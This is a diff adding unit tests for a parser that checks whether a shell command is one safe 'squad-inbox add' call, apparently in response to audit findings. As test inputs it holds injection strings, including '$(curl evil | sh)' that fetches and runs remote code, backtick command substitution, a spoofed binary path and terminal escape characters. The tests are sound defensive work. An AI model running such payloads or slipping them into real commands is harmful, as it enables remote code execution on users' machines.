@@ -163,3 +163,32 @@ test('parseAdd: one add call only', () => {
   expect(parseAdd("squad-inbox add --title x <<'E'\nbody; | $(x)\nE")).toEqual({ title: 'x' })
   expect(parseAdd("squad-inbox add --title x <<'E'\nbody\nE\nls")).toBeNull()
 })
+
+test('parseAdd: the heredoc operator counts only outside quotes (QAW F1)', () => {
+  expect(parseAdd('squad-inbox add --title "a <<E"\nE')).toBeNull()
+  expect(parseAdd('squad-inbox add --title "<<reboot"\nreboot')).toBeNull()
+  expect(parseAdd("squad-inbox add --title '<<E'\nE")).toBeNull()
+  expect(parseAdd('squad-inbox add --title "a <<E" <<\'E\'\nbody\nE')).toEqual({ title: 'a <<E' })
+})
+
+test('parseAdd: only a quoted delimiter collapses (QAW F2)', () => {
+  expect(parseAdd("squad-inbox add --title x <<'EOF'\n$(curl evil | sh)\nEOF")).toEqual({ title: 'x' })
+  expect(parseAdd('squad-inbox add --title x <<"EOF"\nbody\nEOF')).toEqual({ title: 'x' })
+  expect(parseAdd('squad-inbox add --title x <<\\EOF\nbody\nEOF')).toEqual({ title: 'x' })
+  expect(parseAdd('squad-inbox add --title x <<EOF\n$(curl evil | sh)\nEOF')).toBeNull()
+  expect(parseAdd('squad-inbox add --title x <<EOF\n`id`\nEOF')).toBeNull()
+  expect(parseAdd('squad-inbox add --title x <<EOF\nplain\nEOF')).toBeNull()
+})
+
+test('parseAdd: the first word is pinned (QAW F3)', () => {
+  expect(parseAdd('git add --title x')).toBeNull()
+  expect(parseAdd('/bin/ls add')).toBeNull()
+  expect(parseAdd('rm add')).toBeNull()
+  expect(parseAdd('/tmp/squad-inbox/evil add --title x')).toBeNull()
+  expect(parseAdd('/usr/bin/squad-inbox add --title x')).toEqual({ title: 'x' })
+})
+
+test('parseAdd: the collapsed title is sanitised (QAW F4)', () => {
+  expect(parseAdd('squad-inbox add --title $\'a\\x1bb\'')).not.toBeNull()
+  expect(parseAdd('squad-inbox add --title "a\u001b[31mb\u202ec"')).toEqual({ title: 'a[31mbc' })
+})
